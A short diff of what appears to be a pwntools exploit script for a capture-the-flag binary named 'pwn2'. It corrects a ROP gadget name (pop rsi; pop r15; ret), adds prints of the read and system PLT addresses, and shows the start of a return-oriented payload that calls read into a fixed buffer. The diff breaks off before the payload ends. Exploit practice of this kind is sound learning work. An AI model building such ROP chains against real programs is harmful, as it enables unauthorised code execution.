@@ -54,14 +54,15 @@ elf = ELF('./pwn2')
 context(arch='amd64',log_level='debug')
 
 offset = 'a'*16
-pop_rsi_ret = 0x4006d1
+pop_rsi_r15_ret = 0x4006d1
 pop_rdi_ret = 0x4006d3
 
 buf = 0x601010
-
+print 'read@plt', hex(elf.plt['read'])
+print 'system@plt', hex(elf.plt['system'])
 payload = flat([
                 offset,
-                pop_rsi_ret,
+                pop_rsi_r15_ret,
                 buf,
                 'a' * 8,
                 elf.plt['read'],
